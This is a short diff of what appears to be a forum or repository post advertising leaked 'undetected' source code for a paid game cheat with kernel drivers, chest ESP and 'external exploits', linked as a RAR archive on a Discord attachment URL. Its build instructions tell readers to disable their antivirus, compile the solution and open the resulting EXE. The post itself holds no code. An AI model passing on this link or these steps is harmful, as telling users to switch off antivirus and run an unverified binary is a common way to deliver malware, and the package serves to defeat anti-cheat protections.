@@ -4,7 +4,7 @@
 this was a oayed cheat that existed scamm in 2 days here is their ud source with drivers this has cool external exploits etc and chest esp prob best source out rn source: https://cdn.discordapp.com/attachments/931493088751407144/931493267093217281/uranium_chest_esp.rar
 
 Instructions:
-If You Get Errors Disable Anti Virus
+If You Get Errors Disable Anti Virus -
 Put It On Release x64
 Build Solution (CTRL + SHIFT + B)
 Go To The Release Folder And Open The EXE
